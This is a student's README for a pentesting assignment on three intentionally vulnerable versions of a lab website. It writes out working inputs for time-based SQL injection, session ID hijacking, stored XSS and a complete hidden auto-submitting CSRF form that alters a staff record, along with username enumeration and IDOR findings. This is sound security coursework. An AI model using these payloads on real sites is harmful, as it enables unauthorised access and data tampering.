# Project 8 - Pentesting Live Targets

Time spent: **8** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: **SQL Injection (SQLi)**

When I replaced the id number of a salesperson in the URL with ' OR SLEEP(10)=0--' ,it became %27%20OR%20SLEEP(10)=0--%27 when encoded. This causes 10 seconds pause which indicates a successful injection.

<img src="https://media.giphy.com/media/4Z1PT8FgFeHlWCaTow/giphy.gif" width="800">



Vulnerability #2: **Session Hijacking/Fixation**

I used the given PHP script to to get and set the session ID. First I tried in Chrome browser that I was logged in to the blue page. I copied the given session ID, then I switched to Safari that I was not logged in and changed the PHPSESSIONID given by Safari to the copied PHPSESSIONID. Then I was able to login without username and password.  

<img src="https://media.giphy.com/media/SiJXBnSzl186InK8bv/giphy.gif" width="800">


## Green

Vulnerability #1: **Username Enumeration**

In the login page if you try to access the website by existed usernames and a wrong password, the message "Log in was unsuccessful" is bolded. And if you try to login with a non-existent username and a wrong password the message is NOT bolded. 

<img src="https://media.giphy.com/media/1o1im3HP20ewnf4fxN/giphy.gif" width="800">


Vulnerability #2: **Cross-Site Scripting (XSS)**

The attacker can inpute a small script such as <script>alert("XSS")</script>
 in the "Feedback" box of the "Contact" form, which would generate an alert window. When the admin wants to visit the "Feedback" page to read the message his browser will execute the script which generates an alert prompt. (More explanation in Notes)

<img src="https://media.giphy.com/media/1fhbK4IgmmXoIMmi1D/giphy.gif" width="800">



## Red

Vulnerability #1: **Insecure Direct Object Reference (IDOR)**

The red site has an IDOR vulnerability.  In the Salespeople list, Lazy Lazyman with the ID number 11 who has been fired for stealing can be searched by in the public salespeople list whereas the other two sites redirect the attacker back to the list of salespeople to prevent the information leak. 

<img src="https://media.giphy.com/media/pVR9DU6wkhnSPWgXxM/giphy.gif" width="800">


Vulnerability #2: **Cross-Site Request Forgery (CSRF)**

The attacker can trick the admin by sending a blank page link that contains a hidden form: 

    <html>
      <head>
        <title>Blank Page</title>
      </head>
      <body onload="document.CSRF.submit()">
        <form action="https://xx.xxx.xxx.xxx/red/public/staff/salespeople/edit.php?id=8" method="post" style="display: none;" name='CSRF' target="res">
            <input type="text" name="first_name" value="Kim Stanley" />
              <input type="text" name="last_name" value="WAS HACKED!!!" />
              <input type="text" name="phone" value="555-302-7805" />
              <input type="text" name="email" value="kstanley@hacked.com" />
        </form>
        <iframe name="res" style="display: none;"></iframe>
      </body>
    </html>

The information of the salesperson with id number 8 (Kim Stanley) gets modified as soon as the admin loads the blank page. 

<img src="https://media.giphy.com/media/ce28dAryRIbf10YOBS/giphy.gif" width="800">


## Notes

**Green:Vulnerability #2:** For the first time instead of trying <script>alert('Mahshid found the XSS!');</script> I inpute <script>alert("XSS")</script>. I was not able to remove the feeback after I submited, and to avoid the confusion since I 
received "XSS" alert before "Mahshid found the XSS" I created the Gif based on the first tried!

<img src="https://media.giphy.com/media/3eP3jTnna3KoPv3wzy/giphy.gif" width="800">

## License

    Copyright [2018] [Mahshid Mehrayin]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
